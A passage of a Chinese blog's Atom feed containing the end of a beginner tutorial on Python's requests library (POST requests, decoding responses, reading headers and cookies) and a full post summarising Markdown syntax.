class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'https://fanyi.baidu.com'</span></span><br><span class="line"><span class="keyword">data</span> = &#123;<span class="string">'from'</span>: <span class="string">'zh'</span>,</span><br><span class="line">        <span class="string">'to'</span>: <span class="string">'en'</span>,</span><br><span class="line">        <span class="string">'query'</span>: <span class="string">'人生苦短，我用python'</span></span><br><span class="line">        &#125;</span><br><span class="line">response = requests.post(url, <span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">print(response)</span><br></pre></td></tr></table></figure><p>data部分的参数，取自于页面NetWork→Headers→Form Data。打印出来的结果是：&lt;Response [200]&gt;。</p><p><img src="https://upload-images.jianshu.io/upload_images/15064033-ddcceb1f4095b6a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1006/format/webp" alt="img"></p><p>requests post 请求.png</p><h1><span id="response-fang-fa">response方法</span><a href="#response-fang-fa" class="header-anchor">#</a></h1><h5><span id="huo-qu-wang-ye-de-jie-ma-zi-fu-chuan">获取网页的解码字符串</span><a href="#huo-qu-wang-ye-de-jie-ma-zi-fu-chuan" class="header-anchor">#</a></h5><p>通过上述例子我们可以看到，不管是get请求还是post请求，我们得到的返回都是一个Response[200]的对象，但是我们想要得到的，应该是与网页response下一样的字符串对象，这时就需要用到response的方法了。</p><ul><li>response.text。获取网页的HTML字符串，该方式往往会出现乱码，出现乱码使用response.encoding=’utf-8’</li></ul><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://baidu.com'</span></span><br><span class="line">response = requests.<span class="keyword">get</span>(url)</span><br><span class="line">response.encoding = <span class="string">'utf-8'</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><ul><li>response.content.decode()。把相应的二进制字节流转化为str类型。</li></ul><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://baidu.com'</span></span><br><span class="line">response = requests.<span class="keyword">get</span>(url)</span><br><span class="line"><span class="built_in">print</span>(response.content.decode(<span class="string">'gbk'</span>))</span><br></pre></td></tr></table></figure><p>在这里我总结了一下三种获取网页源码的三种方式，通过这三种方式，一定可以获取到网页正确解码之后的字符串：</p><ul><li>response.content.decode()</li><li>response.content.decode(‘gbk’)</li><li>response.text</li></ul><h5><span id="huo-qu-qi-ta-shu-xing">获取其他属性</span><a href="#huo-qu-qi-ta-shu-xing" class="header-anchor">#</a></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">response = requests.get(<span class="string">"http://www.baidu.com"</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.requests.headers),response.requests.headers) <span class="comment">#获取请求头</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.headers),response.headers) <span class="comment">#获取响应头</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.cookies),response.cookies)<span class="comment">#获取响应cookie</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.url),response.url) <span class="comment">#获取响应url</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.requests.url),response.requests.url) <span class="comment">#获取请求url</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;div class=&quot;toc&quot;&gt;

&lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#urllib-de-xiang-jie-shi-yong&quot;&gt;urllib的详解使用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#requests-qing-qiu-fang-
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>markdown语法</title>
    <link href="http://yoursite.com/2019/11/08/markdown%E8%AF%AD%E6%B3%95/"/>
    <id>http://yoursite.com/2019/11/08/markdown语法/</id>
    <published>2019-11-08T08:47:29.806Z</published>
    <updated>2019-11-08T09:11:29.889Z</updated>
    
    <content type="html"><![CDATA[<div class="toc"><!-- toc --><ul><li><a href="#mark-biao-ti">Mark标题</a></li><li><a href="#markdown-duan-luo">Markdown段落</a></li><li><a href="#zi-ti">字体</a></li><li><a href="#fen-ge-xian">分割线</a><ul><li><a href="#">____</a></li></ul></li><li><a href="#markdown-lie-biao">Markdown 列表</a></li><li><a href="#markdown-qu-kuai">Markdown 区块</a></li><li><a href="#markdown-dai-ma">Markdown代码</a></li><li><a href="#markdown-lian-jie">Markdown 链接</a></li><li><a href="#gao-ji-lian-jie">高级链接</a></li><li><a href="#markdown-tu-pian">Markdown 图片</a></li><li><a href="#markdown-biao-ge">Markdown 表格</a></li></ul><!-- tocstop --></div>Markdown语法-------Mark标题=====一级标题--- or #<br>二级标题=== or ##<br>三级标题###<br>四级标题####<br>***————以此类推***<h1><span id="markdown-duan-luo">Markdown段落</span><a href="#markdown-duan-luo" class="header-anchor">#</a></h1><p>Markdown 段落没有特殊的格式，直接编写文字就好，段落的换行是使用两个以上空格加上回车。</p><h1><span id="zi-ti">字体</span><a href="#zi-ti" class="header-anchor">#</a></h1><p>*<em>斜体文本*\</em><br><br>_<em>斜体文本__<br><br>**<strong>粗体文本</strong>**<br><br>__<strong>粗体文本</strong>_\</em><br></p><p>~~<del>删除线</del>~~<br><br><u>&lt;u&gt;下划线&lt;/u&gt;</u>下划线通过 HTML 的标签来实现：<br></p><p><strong>脚注</strong><br><br>脚注是对文本的补充说明。<br>Markdown 脚注的格式如下:</p><p>[^要注明的文本]</p><p>以下实例演示了脚注的用法：</p><p>创建脚注格式类似这样 [^RUNOOB]。</p><p>[^RUNOOB]: 菜鸟教程 – 学的不仅是技术，更是梦想！！！</p><h1><span id="fen-ge-xian">分割线</span><a href="#fen-ge-xian" class="header-anchor">#</a></h1><p>在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线<br><br>----</p><hr><p>----</p><hr><h2><span id>____</span><a href="#" class="header-anchor">#</a></h2><h1><span id="markdown-lie-biao">Markdown 列表</span><a href="#markdown-lie-biao" class="header-anchor">#</a></h1><p>Markdown 支持有序列表和无序列表。</p><p>无序列表使用星号(*)、加号(+)或是减号(-)作为列表标记：</p><ul><li>1</li><li>2</li><li>3</li></ul><p>有序列表使用数字并加上 . 号来表示，如：</p><ol><li>第一项</li><li>第二项</li><li>第三项</li></ol><p>列表嵌套<br>列表嵌套只需在子列表中的选项添加四个空格即可：</p><ol><li>第一项：<ul><li>第一项嵌套的第一个元素</li></ul><ul><li>第一项嵌套的第二个元素</li></ul></li><li>第二项：<ul><li>第二项嵌套的第一个元素</li><li>第二项嵌套的第二个元素</li></ul></li></ol><h1><span id="markdown-qu-kuai">Markdown 区块</span><a href="#markdown-qu-kuai" class="header-anchor">#</a></h1><p>Markdown 区块引用是在段落开头使用 &gt; 符号 ，然后后面紧跟一个空格符号：</p><blockquote><p>区块引用</p></blockquote><blockquote><p>菜鸟教程</p></blockquote><blockquote><p>学的不仅是技术更是梦想</p></blockquote><p>另外区块是可以嵌套的</p><p>一个 &gt; 符号是最外层，两个 &gt; 符号是第一层嵌套，以此类推退：</p><blockquote><p>最外层</p><blockquote><p>第一层嵌套</p><blockquote><p>第二层嵌套</p></blockquote></blockquote></blockquote><p>列表中使用区块</p><p>如果要在列表项目内放进区块，那么就需要在 &gt; 前添加四个空格的缩进。</p><p>区块中使用列表实例如下：</p><ul><li>第一项<blockquote><p>菜鸟教程<br>学的不仅是技术更是梦想</p></blockquote></li><li>第二项</li></ul><h1><span id="markdown-dai-ma">Markdown代码</span><a href="#markdown-dai-ma" class="header-anchor">#</a></h1><p>如果是段落上的一个函数或片段的代码可以用反引号把它包起来（<code>），例如：\</code>printf()`函数</p><p><code>printf()</code>函数</p><hr><p>代码区块<br>代码区块使用 4 个空格或者一个制表符（Tab 键）。<br><br>实例如下：</p><pre><code>&lt;?php echo?&gt;</code></pre><hr><p>你也可以用 ``` 包裹一段代码，并指定一种语言（也可以不指定）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'RUNOOB'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1><span id="markdown-lian-jie">Markdown 链接</span><a href="#markdown-lian-jie" class="header-anchor">#</a></h1><p>链接使用方法如下：<br><a href="链接地址">链接名称</a></p><p>或者</p><p>&lt;链接地址&gt;<br>例如：</p><p>这是一个链接 <a href="https://www.runoob.com" target="_blank" rel="noopener">菜鸟教程</a><br>显示结果如下：</p><p>直接使用链接地址：</p><p><a href="https://www.runoob.com" target="_blank" rel="noopener">https://www.runoob.com</a><br>显示结果如下：</p><h1><span id="gao-ji-lian-jie">高级链接</span><a href="#gao-ji-lian-jie" class="header-anchor">#</a></h1><p>链接也可以用变量来代替，文档末尾附带变量地址：<br><br>这个链接用 1 作为网址变量 <a href="http://www.google.com/<br" target="_blank" rel="noopener">Google</a><br><br>这个链接用 runoob 作为网址变量 <a href="http://www.runoob.com/" target="_blank" rel="noopener">Runoob</a><br><br>然后在文档的结尾为变量赋值（网址）<br></p><h1><span id="markdown-tu-pian">Markdown 图片</span><a href="#markdown-tu-pian" class="header-anchor">#</a></h1><p>Markdown 图片语法格式如下：</p><p><img src="%E5%9B%BE%E7%89%87%E5%9C%B0%E5%9D%80" alt="alt 属性文本"></p><p><img src="%E5%9B%BE%E7%89%87%E5%9C%B0%E5%9D%80" alt="alt 属性文本" title="可选标题"><br>开头一个感叹号 !<br>接着一个方括号，里面放上图片的替代文字<br>接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上选择性的 ‘title’ 属性的文字。<br>使用实例：</p><p><img src="http://static.runoob.com/images/runoob-logo.png" alt="RUNOOB 图标"></p><p><img src="http://static.runoob.com/images/runoob-logo.png" alt="RUNOOB 图标" title="RUNOOB"></p><p><br><br></p><h1><span id="markdown-biao-ge">Markdown 表格</span><a href="#markdown-biao-ge" class="header-anchor">#</a></h1><p>Markdown 制作表格使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行。</p><p>语法格式如下：</p><table><thead><tr><th>表头</th><th>表头</th></tr></thead><tbody><tr><td>单元格</td><td>单元格</td></tr><tr><td>单元格</td><td>单元格</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;div class=&quot;toc&quot;&gt;

&lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#mark-biao-ti&quot;&gt;Mark标题&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#markdown-duan-luo&quot;&gt;Markdown段落&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
